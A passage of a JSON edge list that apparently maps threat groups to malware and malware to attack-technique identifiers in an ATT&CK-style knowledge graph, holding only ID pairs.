            "target": "T1132.001"
        },
        {
            "source": "S0032",
            "target": "T1574.002"
        },
        {
            "source": "S0032",
            "target": "T1568.001"
        },
        {
            "source": "S0032",
            "target": "T1569.002"
        },
        {
            "source": "S0032",
            "target": "T1056.001"
        },
        {
            "source": "S0032",
            "target": "T1070.004"
        },
        {
            "source": "S0032",
            "target": "T1070.001"
        },
        {
            "source": "S0032",
            "target": "T1547.001"
        },
        {
            "source": "S0032",
            "target": "T1218.011"
        },
        {
            "source": "S0032",
            "target": "T1543.003"
        },
        {
            "source": "S0032",
            "target": "T1140"
        },
        {
            "source": "S0032",
            "target": "T1129"
        },
        {
            "source": "S0032",
            "target": "T1113"
        },
        {
            "source": "S0032",
            "target": "T1112"
        },
        {
            "source": "S0032",
            "target": "T1106"
        },
        {
            "source": "S0032",
            "target": "T1105"
        },
        {
            "source": "S0032",
            "target": "T1095"
        },
        {
            "source": "S0032",
            "target": "T1082"
        },
        {
            "source": "S0032",
            "target": "T1059"
        },
        {
            "source": "S0032",
            "target": "T1057"
        },
        {
            "source": "S0032",
            "target": "T1055"
        },
        {
            "source": "S0032",
            "target": "T1012"
        },
        {
            "source": "G0126",
            "target": "S0032"
        },
        {
            "source": "G0126",
            "target": "S0013"
        },
        {
            "source": "S0073",
            "target": "T1505.003"
        },
        {
            "source": "G0125",
            "target": "S0073"
        },
        {
            "source": "S0029",
            "target": "T1570"
        },
        {
            "source": "S0029",
            "target": "T1569.002"
        },
        {
            "source": "S0029",
            "target": "T1021.002"
        },
        {
            "source": "G0125",
            "target": "S0029"
        },
        {
            "source": "S0020",
            "target": "T1071.001"
        },
        {
            "source": "S0020",
            "target": "T1059.003"
        },
        {
            "source": "S0020",
            "target": "T1110.001"
        },
        {
            "source": "S0020",
            "target": "T1027.002"
        },
        {
            "source": "S0020",
            "target": "T1070.006"
        },
        {
            "source": "S0020",
            "target": "T1505.003"
        },
        {
            "source": "S0020",
            "target": "T1105"
        },
        {
            "source": "S0020",
            "target": "T1083"
        },
        {
            "source": "S0020",
            "target": "T1046"
        },
        {
            "source": "S0020",
            "target": "T1005"
        },
        {
            "source": "G0125",
            "target": "S0020"
        },
        {
            "source": "S0377",
            "target": "T1556.003"
        },
        {
            "source": "S0377",
            "target": "T1562.006"
        },
        {
            "source": "S0377",
            "target": "T1573.001"
        },
        {
            "source": "S0377",
            "target": "T1071.004"
        },
        {
            "source": "S0377",
            "target": "T1132.001"
        },
        {
            "source": "S0377",
            "target": "T1574.006"
        },
        {
            "source": "S0377",
            "target": "T1568.002"
        },
        {
            "source": "S0377",
            "target": "T1059.006"
        },
        {
            "source": "S0377",
            "target": "T1562.001"
        },
        {
            "source": "S0377",
            "target": "T1556"
        },
        {
            "source": "S0377",
            "target": "T1554"
        },
        {
            "source": "S0377",
            "target": "T1553.002"
        },
        {
            "source": "S0377",
            "target": "T1552.004"
        },
        {
            "source": "S0377",
            "target": "T1140"
        },
        {
            "source": "S0377",
            "target": "T1083"
        },
        {
            "source": "S0377",
            "target": "T1041"
        },
        {
            "source": "S0377",
            "target": "T1027"
        },
        {
            "source": "S0377",
            "target": "T1020"
        },
        {
            "source": "S0377",
            "target": "T1014"
        },
        {
            "source": "S0377",
            "target": "T1008"
        },
        {
            "source": "G0124",
            "target": "S0377"
        },
        {
            "source": "S0572",
            "target": "T1069.001"
        },
        {
            "source": "S0572",
            "target": "T1059.003"
        },
        {
            "source": "S0572",
            "target": "T1112"
        },
        {
            "source": "S0572",
            "target": "T1110"
        },
        {
            "source": "S0572",
            "target": "T1105"
        },
        {
            "source": "S0572",
            "target": "T1083"
        },
        {
            "source": "S0572",
            "target": "T1082"
        },
        {
            "source": "S0572",
            "target": "T1057"
        },
        {
            "source": "S0572",
            "target": "T1046"
        },
        {
            "source": "S0572",
            "target": "T1041"
        },
        {
            "source": "S0572",
            "target": "T1033"
        },
        {
            "source": "S0572",
            "target": "T1016"
        },
        {
            "source": "S0572",
            "target": "T1014"
        },
        {
            "source": "S0572",
            "target": "T1007"
        },
        {
            "source": "S0572",
            "target": "T1005"
        },
        {
            "source": "G0123",
            "target": "S0572"
        },
        {
            "source": "S0569",
            "target": "T1573.001"
        },
        {
            "source": "S0569",
            "target": "T1071.001"
        },
        {
            "source": "S0569",
            "target": "T1564.001"
        },
        {
            "source": "S0569",
            "target": "T1056.001"
        },
        {
            "source": "S0569",
            "target": "T1115"
        },
        {
            "source": "S0569",
            "target": "T1112"
        },
        {
            "source": "S0569",
            "target": "T1106"
        },
        {
            "source": "S0569",
            "target": "T1105"
        },
        {
            "source": "S0569",
            "target": "T1082"
        },
        {
            "source": "S0569",
            "target": "T1033"
        },
        {
            "source": "S0569",
            "target": "T1025"
        },
        {
            "source": "S0569",
            "target": "T1016"
        },
        {
            "source": "G0123",
            "target": "S0569"
        },
        {
            "source": "S0250",
            "target": "T1573.002"
        },
        {
            "source": "S0250",
            "target": "T1569.002"
        },
        {
            "source": "S0250",
            "target": "T1059.005"
        },
        {
            "source": "S0250",
            "target": "T1059.003"
        },
        {
            "source": "S0250",
            "target": "T1003.003"
        },
        {
            "source": "S0250",
            "target": "T1003.002"
        },
        {
            "source": "S0250",
            "target": "T1021.001"
        },
        {
            "source": "S0250",
            "target": "T1548.002"
        },
        {
            "source": "S0250",
            "target": "T1218.010"
        },
        {
            "source": "S0250",
            "target": "T1218.005"
        },
        {
            "source": "S0250",
            "target": "T1218.011"
        },
        {
            "source": "S0250",
            "target": "T1055.001"
        },
        {
            "source": "S0250",
            "target": "T1135"
        },
        {
            "source": "S0250",
            "target": "T1115"
        },
        {
            "source": "S0250",
            "target": "T1105"
        },
        {
            "source": "S0250",
            "target": "T1047"
        },
        {
            "source": "S0250",
            "target": "T1046"
        },
        {
            "source": "S0250",
            "target": "T1033"
        },
        {
            "source": "S0250",
            "target": "T1016"
        },
        {
            "source": "S0250",
            "target": "T1005"
        },
        {
            "source": "G0121",
            "target": "S0250"
        }
    ]
}